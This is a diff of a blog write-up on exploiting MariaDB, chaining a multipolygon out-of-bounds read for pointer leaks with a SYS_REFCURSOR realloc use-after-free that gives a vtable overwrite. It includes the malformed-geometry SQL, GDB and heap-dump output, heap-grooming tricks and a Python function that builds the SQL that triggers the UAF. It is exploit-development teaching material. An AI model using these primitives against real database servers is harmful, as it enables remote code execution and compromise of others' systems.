@@ -30,38 +30,44 @@
 
       <p>As we will see, the primitives are actually quite simple -- it's a heap OOB and a realloc-based UAF that leads to a vtable overwrite. Very nice and digestible! As a relative beginner to pwning actual, multi-thousand LoC systems instead of abstract, simplified CTF pwn challenges, I find that an exploit like this is a very natural stepping-stone to improving my exploitation skills. The complexity is not brought about through arcane ptmalloc functionality, rather, the surrounding structure of an actual application makes the task difficult, instead. Also, it's fun!</p>
 
-      <h2>Brief polemic</h2>
-
-      <p>A small, annoying voice in the ocean of voices about AI:</p>
-
-      <p>The thing about the wealth of information AI-led vulnerability research provides is that it is basically now unnecessary for anyone to actually <i>know</i> what these exploits do. The v12 Tweet on my page sits between five hundred different AI-written writeups for vulnerabilities of this nature, including (but not limited) to THREE different guest-to-host KVM escapes. Whenever these show up, I do earnestly try to read them, but if this were my livelihood and I needed to keep churning out bugs to hit Pwn2Own deadlines I wouldn't much care either about stuff like reading writeups or iterating on exploits. I would just keep /goaling.</p>
-
-      <p>So, it begs the question -- there are thousands of similar exploits and their associated writeups being produced in a week's time. Who is reading all of these? Who actually has an understanding of these systems anymore, aside from the maintainers themselves? These exploits, aside from their obvious monetary value, have little value to anyone else outside of the maintainers and the exploit developers themselves. This obviously has always been true, but now with the sheer scale and volume of these writeups, it only serves to make this question more apparent. Who on Earth has the time?</p>
-
-      <p>I believe that this ocean of information is, ultimately, what you make of it. Here is me attempting to scoop some of that out for myself. That is the primary motivation behind this work, aside from the obvious answer (it's just fun to do).</p>
-
       <h2>Writeup</h2>
 
       <p>Enough of that, time to pwn. Here we are dealing with two different bugs: an OOB read for our leaks, and a UAF that leads to a vtable overwrite and eventual RCE. The first bug has been disclosed and patched, the second bug has (to my knowledge) not been publically patched yet. This puts me in a bit of an ethical gray area with regards to the detail I provide in this writeup, but, ah, if it's good enough for v12 then it's good enough for me.</p>
 
+      <i>As an aside: I took so long to finish this post that CVEs have been issued. Oops! <a href="https://github.com/MariaDB/server/security/advisories/GHSA-mv8g-9f7q-hprm">The use-after-free is CVE-2026-85748</a>, and the <a href="https://github.com/MariaDB/server/security/advisories/GHSA-p7v9-24h4-mch8">OOB read is CVE-2026-85745.</a></i>
+
       <h2>Bug 1 -- the leak</h2>
 
-      <p>The first bug is about some insane shit in MariaDB called a `multipolygon`, which is apparently used to keep track of geographic areas. This is a niche, pretty absurd, complex subsystem in an already large program, so it makes sense that a bug has fallen through here. It is a nice, small lesson about where to look for these sort of bugs: if there's some absurd shit like `multipolygons` in a program you're auditing there's probably something worth poking at.</p>
+      <p>The first bug is about some insane shit in MariaDB called a <span class='monospace'>multipolygon</span>, which is apparently used to keep track of geographic areas. This is a niche, pretty absurd, complex subsystem in an already large program, so it makes sense that a bug has fallen through here. It is a nice, small lesson about where to look for these sort of bugs: if there's some absurd shit like <span class='monospace'>multipolygons</span> in a program you're auditing there's probably something worth poking at.</p>
 
       <p>Simply put, a multipolygon is a simple data structure consisting of a binary header followed by a number of polygons. This binary header contains information about the number of polygons contained within the multipolygon itself. When we want to calculate the multipolygon's area, we iterate over that number, as stated in the multipolygon header.</p>
 
+      <div class='mdb-image-cont'>
+        <div class='img-wrap'>
+        <img src='/assets/mariadb_mpolygon.png'><br>
+        </div>
+        <i>Structure of a multipolygon. Note the format of the data header, and how the multipolygon specifies how many polygons follow the header.</i>
+      </div>
+
       <p>Hopefully it should be obvious where this is going. When we trigger an area calculation, there is no check on whether or not the multipolygon actually has the number of polygons stated. We can construct a multipolygon that claims to have two polygons, but actually just has one. This causes our area calculations to try to parse adjacent heap data (pointers, etc.) as polygon information -- the resulting area value may, therefore, encode heap pointer information somehow!</p>
+
+      <div class='mdb-image-cont'>
+        <div class='img-wrap'>
+        <img src='/assets/mcorrupt.png'><br>
+        </div>
+        <i>Result of creating a malformed polygon header.</i>
+      </div>
 
       <p>I think this bug is actually really cool in the way that it manifests. The read isn't direct, and it is sort of type-confusiony. To get a more reliable read, we do need fine-grained control over the polygon data we send. Let's first explore how polygon data is actually stored on the heap, and what might be adjacent to our controlled polygon data. We can do this by taking a look at how v12 does it first: it does this by creating a table with three columns. The first two columns are binary data that eventually get parsed as polygon data, and then the third column is a pointer to a BLOB object on the heap (right now, this is all "A"s). The exact query is shown below.</p>
 
-      <div class='mdb-image-cont'><pre><code><span style="color:#3b4261;">      8   </span><span style="color:#65bcff;">│</span><span style="color:#c8d3f5;">   cy</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">execute</span><span style="color:#828bb8;">(</span><span style="color:#c3e88d;">&quot;DROP TABLE IF EXISTS lk&quot;</span><span style="color:#828bb8;">)</span><span style="color:#c8d3f5;">
-  </span><span style="color:#3b4261;">    7   </span><span style="color:#65bcff;">│</span><span style="color:#c8d3f5;">   cy</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">execute</span><span style="color:#828bb8;">(</span><span style="color:#c3e88d;">&quot;CREATE TEMPORARY TABLE lk(a VARBINARY(74), b VARBINARY(66), c BLOB)&quot;</span><span style="color:#828bb8;">)</span><span style="color:#c8d3f5;">
-  </span><span style="color:#3b4261;">    6   </span><span style="color:#65bcff;">│</span><span style="color:#c8d3f5;">   cy</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">execute</span><span style="color:#828bb8;">(</span><span style="color:#c3e88d;">&quot;INSERT INTO lk VALUES (0x</span><span style="color:#65bcff;">%s</span><span style="color:#c3e88d;">,0x</span><span style="color:#65bcff;">%s</span><span style="color:#c3e88d;">,0x</span><span style="color:#65bcff;">%s</span><span style="color:#c3e88d;">)&quot;</span><span style="color:#c8d3f5;">
-  </span><span style="color:#3b4261;">    5   </span><span style="color:#65bcff;">│</span><span style="color:#c8d3f5;">   </span><span style="color:#3b4261;">│</span><span style="color:#c8d3f5;">           </span><span style="color:#89ddff;">%</span><span style="color:#c8d3f5;"> </span><span style="color:#828bb8;">(</span><span style="color:#c8d3f5;">_GEOM74</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">hex</span><span style="color:#828bb8;">()</span><span style="color:#89ddff;">,</span><span style="color:#c8d3f5;"> </span><span style="color:#65bcff;">bytes</span><span style="color:#828bb8;">(</span><span style="color:#c8d3f5;">b</span><span style="color:#828bb8;">)</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">hex</span><span style="color:#828bb8;">()</span><span style="color:#89ddff;">,</span><span style="color:#c8d3f5;"> payload</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">hex</span><span style="color:#828bb8;">()))</span><span style="color:#c8d3f5;"></span></code></pre>
-        <i>SQL query that creates the malformed multipolygon. `_GEOM74` and `b` are prewritten structs from v12 (our headers), which control (among other things) the number of points in each polygon.</i>
+      <div class='mdb-image-cont'><pre><code><span style="color:#6e7781;">      8   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;DROP TABLE IF EXISTS lk&quot;</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
+  </span><span style="color:#6e7781;">    7   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;CREATE TEMPORARY TABLE lk(a VARBINARY(74), b VARBINARY(66), c BLOB)&quot;</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
+  </span><span style="color:#6e7781;">    6   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;INSERT INTO lk VALUES (0x</span><span style="color:#0550ae;">%s</span><span style="color:#0a3069;">,0x</span><span style="color:#0550ae;">%s</span><span style="color:#0a3069;">,0x</span><span style="color:#0550ae;">%s</span><span style="color:#0a3069;">)&quot;</span><span style="color:#1f2328;">
+  </span><span style="color:#6e7781;">    5   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">           </span><span style="color:#0550ae;">%</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">_GEOM74</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">hex</span><span style="color:#0550ae;">()</span><span style="color:#0550ae;">,</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">bytes</span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">b</span><span style="color:#0550ae;">)</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">hex</span><span style="color:#0550ae;">()</span><span style="color:#0550ae;">,</span><span style="color:#1f2328;"> payload</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">hex</span><span style="color:#0550ae;">()))</span><span style="color:#1f2328;"></span></code></pre>
+        <i>SQL query that creates the malformed multipolygon. <span class='monospace'>_GEOM74</span> and <span class='monospace'>b</span> are prewritten structs from v12 (our headers), which control (among other things) the number of points in each polygon.</i>
       </div>
 
-      <p>v12's exploit actually gave me some helpful structs, `_GEOM74` and `b`. `_GEOM74` is the malformed multipolygon header, which tells MariaDB there are two polygons within the multipolygon.. It also contains a simple polygon with three points, all at 0 (this means that its area is also 0!). `b` is an 'incomplete' polygon whose header states it has four points, but it only contains three points worth of data. The first two points are at 0, but the last point is at (1e300, 0). Because there are four points stated but only three points speciifed, the adjacent column `c` (our heap pointer) will become that fourth point.</p>
+      <p>v12's exploit actually gave me some helpful structs, <span class='monospace'>_GEOM74</span> and <span class='monospace'>b</span>. <span class='monospace'>_GEOM74</span> is the malformed multipolygon header, which tells MariaDB there are two polygons within the multipolygon. It also contains a simple polygon with three points, all at 0 (this means that its area is also 0!). <span class='monospace'>b</span> is an 'incomplete' polygon whose header states it has four points, but it only contains three points worth of data. The first two points are at 0, but the last point is at (1e300, 0). Because there are four points stated but only three points speciifed, the adjacent column <span class='monospace'>c</span> (our heap pointer) will become that fourth point.</p>
 
       <p>These are all contiguously laid out as adjacent fields on the heap. By viewing the heap directly, we can see the general structure of the polygon data: there is some (unhelpful for our case) header information, then the vertices of each polygon are just stored as <b>adjacent (x,y) QWORD double pairs.</b></p>
 
@@ -72,42 +78,42 @@
         <i>Heap layout. Note the correspondence with the above query: polygon 1 is the 'A' column, polygon 2 is the 'B' column, and our heap pointer is C. Naturally, they are all adjacent!</i>
       </div>
 
-      <p>Let us get a clearer view of how this is actually parsed as polygon data. I had AI write me a GDB script here: I would break at the relevant area functions (`Gis_polygon::area`) and get it to parse the pointer to the polygon stored in `$rdi`. Here is the parsed data for the second malformed polygon which contains our heap pointer.</p>
+      <p>Let us get a clearer view of how this is actually parsed as polygon data. I had AI write me a GDB script here: I would break at the relevant area functions (<span class='monospace'>Gis_polygon::area</span>) and get it to parse the pointer to the polygon stored in <span class='monospace'>$rdi</span>. Here is the parsed data for the second malformed polygon which contains our heap pointer.</p>
 
       <div class='mdb-image-cont'>
-      <pre><code><span style="font-weight:bold;"></span><span style="font-weight:bold;color:green;">gef&gt; </span>source pgon3.py
-<span style="font-weight:bold;"></span><span style="font-weight:bold;color:green;">gef&gt; </span>print-polygon $rdi
+      <pre><code><span style="font-weight:bold;"></span><span style="font-weight:bold;color:#6639ba;">gef&gt; </span>source pgon3.py
+<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#6639ba;">gef&gt; </span>print-polygon $rdi
 
-<span style="color:teal;">══════════════ Gis_polygon ══════════════</span>
+<span style="color:#0550ae;">══════════════ Gis_polygon ══════════════</span>
   <span style="color:olive;">object</span>     @ 0x7fb65c1277c0
-  <span style="color:olive;">vtable</span>     = <span style="color:blue;">0x563610b5bf18</span>
-  <span style="color:olive;">m_data</span>     = <span style="color:blue;">0x77b61800b6a1</span>
-  <span style="color:olive;">m_data_end</span> = <span style="color:blue;">0x77b71800b69c</span>
+  <span style="color:olive;">vtable</span>     = <span style="color:#0550ae;">0x563610b5bf18</span>
+  <span style="color:olive;">m_data</span>     = <span style="color:#0550ae;">0x77b61800b6a1</span>
+  <span style="color:olive;">m_data_end</span> = <span style="color:#0550ae;">0x77b71800b69c</span>
 
-<span style="color:teal;">n_linear_rings</span> = <span style="font-weight:bold;">1</span>
+<span style="color:#0550ae;">n_linear_rings</span> = <span style="font-weight:bold;">1</span>
 
-<span style="color:blue;">──────────── ring[0] ────────────</span>
+<span style="color:#0550ae;">──────────── ring[0] ────────────</span>
   <span style="color:olive;">header</span>    @ 0x77b61800b6a5
   <span style="color:olive;">n_points</span>  = <span style="font-weight:bold;">4</span>  (avail=268435455)
-  <span style="color:teal;">point[0]</span> @ 0x77b61800b6a9
-      <span style="color:olive;">x</span> = <span style="color:green;">0.0</span> (raw=0x0000000000000000)
-      <span style="color:olive;">y</span> = <span style="color:green;">0.0</span> (raw=0x0000000000000000)
-  <span style="color:teal;">point[1]</span> @ 0x77b61800b6b9
-      <span style="color:olive;">x</span> = <span style="color:green;">0.0</span> (raw=0x0000000000000000)
-      <span style="color:olive;">y</span> = <span style="color:green;">0.0</span> (raw=0x0000000000000000)
-  <span style="color:teal;">point[2]</span> @ 0x77b61800b6c9
-      <span style="color:olive;">x</span> = <span style="color:green;">1e+300</span> (raw=0x7e37e43c8800759c)
-      <span style="color:olive;">y</span> = <span style="color:green;">0.0</span> (raw=0x0000000000000000)
-  <span style="color:teal;">point[3]</span> @ 0x77b61800b6d9
-      <span style="color:olive;">x</span> = <span style="color:green;">1.344974619049452e-284</span> (raw=0x0500000000000000)
-      <span style="color:olive;">y</span> = <span style="color:green;">6.5030842125933e-310</span> (raw=0x000077b6133228f8)
+  <span style="color:#0550ae;">point[0]</span> @ 0x77b61800b6a9
+      <span style="color:olive;">x</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+      <span style="color:olive;">y</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+  <span style="color:#0550ae;">point[1]</span> @ 0x77b61800b6b9
+      <span style="color:olive;">x</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+      <span style="color:olive;">y</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+  <span style="color:#0550ae;">point[2]</span> @ 0x77b61800b6c9
+      <span style="color:olive;">x</span> = <span style="color:#6639ba;">1e+300</span> (raw=0x7e37e43c8800759c)
+      <span style="color:olive;">y</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+  <span style="color:#0550ae;">point[3]</span> @ 0x77b61800b6d9
+      <span style="color:olive;">x</span> = <span style="color:#6639ba;">1.344974619049452e-284</span> (raw=0x0500000000000000)
+      <span style="color:olive;">y</span> = <span style="color:#6639ba;">6.5030842125933e-310</span> (raw=0x000077b6133228f8)
 
-  <span style="color:olive;">terms_sum</span> = <span style="color:green;">6.503084212593292e-10</span>
-  <span style="color:purple;">ring area</span> = <span style="color:green;">3.251542106296646e-10</span>
+  <span style="color:olive;">terms_sum</span> = <span style="color:#6639ba;">6.503084212593292e-10</span>
+  <span style="color:#6639ba;">ring area</span> = <span style="color:#6639ba;">3.251542106296646e-10</span>
 
-<span style="color:teal;">══════════════════════════════════════════</span>
-<span style="color:purple;">total area</span> = <span style="color:green;">3.251542106296646e-10
-</span><span style="color:teal;">══════════════════════════════════════════</span></code></pre>
+<span style="color:#0550ae;">══════════════════════════════════════════</span>
+<span style="color:#6639ba;">total area</span> = <span style="color:#6639ba;">3.251542106296646e-10
+</span><span style="color:#0550ae;">══════════════════════════════════════════</span></code></pre>
       <i>Pretty-print of the polygon data</i>  
       </div>
 
@@ -135,7 +141,7 @@ leaked address: 0x774fd3fe7738</code></pre>
 
       <p>Neat! We can now leak adjacent pointers. The natural next step is to then leak PIE, but this proves to be a far harder challenge. We leaked a heap pointer because placing a BLOB entry next to our malformed polygons directly inserts a heap pointer adjacent to the polygon data, but we have no such luck for a PIE pointer -- there is no datatype we could place that would just happily insert one of these PIE pointers where we want.</p>
 
-      <p>If we cannot place a PIE pointer in our table, the next idea is then to place a PIE pointer in an adjacent or nearby chunk to our table. The chunk where our polygon data is placed is an `0x2000` sized chunk. If we can somehow get another chunk <i>near</i> that chunk we can control with a PIE pointer, and just make the polygon consume a bunch of points, perhaps this will still work to leak that PIE pointer?</p>
+      <p>If we cannot place a PIE pointer in our table, the next idea is then to place a PIE pointer in an adjacent or nearby chunk to our table. The chunk where our polygon data is placed is an <span class='monospace'>0x2000</span> sized chunk. If we can somehow get another chunk <i>near</i> that chunk we can control with a PIE pointer, and just make the polygon consume a bunch of points, perhaps this will still work to leak that PIE pointer?</p>
 
       <div class='mdb-image-cont'>
         <div class='img-wrap'>
@@ -151,20 +157,20 @@ leaked address: 0x774fd3fe7738</code></pre>
       <p>This, to me, is really ridiculous, but it works, apparently! Note the following two examples, where I show the average contents of a freed chunk, and the corresponding doubles they get parsed to.</p>
 
       <div class='mdb-image-cont'>
-        <pre><code><span style="color:blue;">0x77bd4ef079f0</span>: 0x77bd4ef07a20  0x77bd4ef07b20
-  <span style="color:blue;">0x77bd4ef07a00</span>: 0x77bd4ef07c20  0x77bd4ef07d20
-  <span style="color:blue;">0x77bd4ef07a10</span>: 0x0     0x0
-  <span style="color:blue;">0x77bd4ef07a20</span>: 0x55798cee1e68  0x77bd4ef07821
-  <span style="color:blue;">0x77bd4ef07a30</span>: 0x0     0x77bd4ef07820
-  <span style="color:blue;">0x77bd4ef07a40</span>: 0x0     0x7fbd941e1d30
-  <span style="color:blue;">0x77bd4ef07a50</span>: 0x7fbd941e1d30  0x7fbd941e1e48
-  <span style="color:blue;">0x77bd4ef07a60</span>: 0x77bd4ef0df31  0x1
-  <span style="color:blue;">0x77bd4ef07a70</span>: 0x55798c746ad7  0x0
-  <span style="color:blue;">0x77bd4ef07a80</span>: 0x0     0x0
-  <span style="color:blue;">0x77bd4ef07a90</span>: 0x0     0x0
-  <span style="color:blue;">0x77bd4ef07aa0</span>: 0x0     0x0
-  <span style="color:blue;">0x77bd4ef07ab0</span>: 0x0     0x600000000
-  <span style="color:blue;">0x77bd4ef07ac0</span>: 0x1000000000080 0x3ff0000000000000
+        <pre><code><span style="color:#0550ae;">0x77bd4ef079f0</span>: 0x77bd4ef07a20  0x77bd4ef07b20
+  <span style="color:#0550ae;">0x77bd4ef07a00</span>: 0x77bd4ef07c20  0x77bd4ef07d20
+  <span style="color:#0550ae;">0x77bd4ef07a10</span>: 0x0     0x0
+  <span style="color:#0550ae;">0x77bd4ef07a20</span>: 0x55798cee1e68  0x77bd4ef07821
+  <span style="color:#0550ae;">0x77bd4ef07a30</span>: 0x0     0x77bd4ef07820
+  <span style="color:#0550ae;">0x77bd4ef07a40</span>: 0x0     0x7fbd941e1d30
+  <span style="color:#0550ae;">0x77bd4ef07a50</span>: 0x7fbd941e1d30  0x7fbd941e1e48
+  <span style="color:#0550ae;">0x77bd4ef07a60</span>: 0x77bd4ef0df31  0x1
+  <span style="color:#0550ae;">0x77bd4ef07a70</span>: 0x55798c746ad7  0x0
+  <span style="color:#0550ae;">0x77bd4ef07a80</span>: 0x0     0x0
+  <span style="color:#0550ae;">0x77bd4ef07a90</span>: 0x0     0x0
+  <span style="color:#0550ae;">0x77bd4ef07aa0</span>: 0x0     0x0
+  <span style="color:#0550ae;">0x77bd4ef07ab0</span>: 0x0     0x600000000
+  <span style="color:#0550ae;">0x77bd4ef07ac0</span>: 0x1000000000080 0x3ff0000000000000
         </code></pre>
         <i>Contents of a freed chunk. Note the pointers, as well as random other values</i>
 
@@ -206,13 +212,230 @@ leaked address: 0x774fd3fe7738</code></pre>
 
       <p>However, we still do not have a suitable target here. We can theoretically perform our leaks, but we do not have a chunk in mind that we can use to perform the PIE leak. Recall our constraints on this target chunk: we need to be able to control the data prior to the PIE pointer exactly, and we need to be able to allocate it easily. This will be detailed in the following section.</p>
 
+      <p>A small bit of housekeeping before any of that, though: MariaDB is actually quite lax when it comes to heap grooming. There is a very useful query <span class='monospace'>SET @... = [blah]</span> that allows us to store arbitrarily sized data as some global variable, and this all gets stored in differently sized chunks in the heap. We can control the exact size of these allocations, and we can even free the chunks by simply doing <span class='monospace'>SET @... = NULL</span>. This will be very useful later on.</p>
+
       <h2>Second bug -- UAF with SYS_REFCURSOR objects</h2>
 
-      <p>The second bug is a UAF with SYS_REFCURSOR objects. The gist of this bug is that these objects are stored in a dynamically sized array which is occasionally `realloc()'d` when more objects are appended. As we all know, `realloc()` can operate in one of two ways: consolidating adjacent freed chunks to create a larger contiguous space, or simply just freeing the old, small chunk and allocating a newer, bigger chunk. For our use case, the program will almost always take the latter path (that is, freeing the old chunk and allocating another).</p>
+      <p>The second bug is a UAF with SYS_REFCURSOR objects. The gist of this bug is that these objects are stored in a dynamically sized array which is occasionally <span class='monospace'>realloc()'d</span> when more objects are appended. As we all know, <span class='monospace'>realloc()</span> can operate in one of two ways: consolidating adjacent freed chunks to create a larger contiguous space, or simply just freeing the old, small chunk and allocating a newer, bigger chunk. For our use case, the program will almost always take the latter path (that is, freeing the old chunk and allocating another).</p>
 
-      <p>The dynamic arrays happen to grow according to powers of two. This means that if we allocate 15 SYS_REFCURSORs, the dynamic array they are stored inside can still fit another SYS_REFCURSOR object (the 16th), but if we attempt to add a 17th object, the `realloc()` will occur. Similarly, if we keep allocating until our array contains 32 SYS_REFCURSORs, no `realloc()` will occur, but another (the 33rd) and it will.</p>
+      <p>The dynamic arrays happen to grow according to powers of two. This means that if we allocate 15 SYS_REFCURSORs, the dynamic array they are stored inside can still fit another SYS_REFCURSOR object (the 16th), but if we attempt to add a 17th object, the <span class='monospace'>realloc()</span> will occur. Similarly, if we keep allocating until our array contains 32 SYS_REFCURSORs, no <span class='monospace'>realloc()</span> will occur, but another (the 33rd) and it will.</p>
 
+      <p>The UAF occurs when a single query triggers this re-allocation <i>and</i> uses the REFCURSORS. When, say, a 17th REFCURSOR is added to the array, the old array is freed, but it will still be referenced by any subsequent usage of the REFCURSORS. Therefore, this is our use-after-free. We also get an immediately simple way to control RIP, as the dynamically allocated REFCURSOR array contains vtable pointers that we can trivially overwrite by reclaiming the chunk. (Recall that we can reclaim this chunk by issuing an allocation of the same size through the <span class='monospace'>SET @...</span> trick.)</p>
+  
+      <p>Fairly simple stuff. Let's look at a query that will trigger this bug.</p>
 
+      <pre><code><span style="color:#6e7781;">   14   </span><span style="color:#6639ba;">def</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">build_uaf_sql</span><span style="color:#0550ae;">(</span><span style="color:#ffc777;">blob_hex</span><span style="color:#0550ae;">)</span><span style="color:#0550ae;">:</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   13   │</span><span style="color:#1f2328;">   decls </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#0a3069;">&quot;</span><span style="color:#6639ba;">\n</span><span style="color:#0a3069;">&quot;</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">join</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;  DECLARE c</span><span style="color:#0550ae;">%d</span><span style="color:#0a3069;"> SYS_REFCURSOR;&quot;</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">%</span><span style="color:#1f2328;"> i </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#ff966c;">33</span><span style="color:#0550ae;">))</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   12   │</span><span style="color:#1f2328;">   opens </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#0a3069;">&quot;</span><span style="color:#6639ba;">\n</span><span style="color:#0a3069;">&quot;</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">join</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;  OPEN c</span><span style="color:#0550ae;">%d</span><span style="color:#0a3069;"> FOR SELECT 1;&quot;</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">%</span><span style="color:#1f2328;"> i </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#ff966c;">33</span><span style="color:#0550ae;">))</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   11   │</span><span style="color:#1f2328;">   sprays </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#0a3069;">&quot;&quot;</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">join</span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   10   │</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">[</span><span style="color:#0a3069;">f&quot;SET @</span><span style="color:#0550ae;">{</span><span style="color:#6639ba;">randstr</span><span style="color:#0550ae;">()</span><span style="color:#0550ae;">}</span><span style="color:#0a3069;"> = 0x</span><span style="color:#0550ae;">{</span><span style="color:#1f2328;">blob_hex</span><span style="color:#0550ae;">}</span><span style="color:#0a3069;">;</span><span style="color:#6639ba;">\n</span><span style="color:#0a3069;">&quot;</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#ff966c;">0x50</span><span style="color:#0550ae;">)]</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    9   │</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    8   │</span><span style="color:#1f2328;">   </span><span style="font-style:italic;color:#1f2328;"></span><span style="font-style:italic;color:#fca7ea;">return</span><span style="color:#1f2328;"></span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">(</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;BEGIN NOT ATOMIC</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> decls </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">  DECLARE a INT;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> sprays </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;">
+</span><span style="color:#6e7781;background-color:#f6f8fa;">    7   │</span><span style="color:#1f2328;background-color:#f6f8fa;">   </span><span style="color:#6e7781;background-color:#f6f8fa;">│</span><span style="color:#1f2328;background-color:#f6f8fa;">       </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;  SET @@max_open_cursors=200;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> opens </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;">
+</span><span style="color:#6e7781;background-color:#f6f8fa;">    6   │</span><span style="color:#1f2328;background-color:#f6f8fa;">   </span><span style="color:#6e7781;background-color:#f6f8fa;">│</span><span style="color:#1f2328;background-color:#f6f8fa;">       </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;  SET @s1 = 0x&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> blob_hex </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;">
+</span><span style="color:#6e7781;background-color:#f6f8fa;">    5   │</span><span style="color:#1f2328;background-color:#f6f8fa;">   </span><span style="color:#6e7781;background-color:#f6f8fa;">│</span><span style="color:#1f2328;background-color:#f6f8fa;">       </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;  FETCH c16 INTO a;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">END</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#0550ae;background-color:#f6f8fa;">)</span><span style="color:#1f2328;background-color:#f6f8fa;">
+</span><span style="color:#6e7781;background-color:#f6f8fa;">    4   </span><span style="color:#1f2328;background-color:#f6f8fa;"></span></code></pre>
+
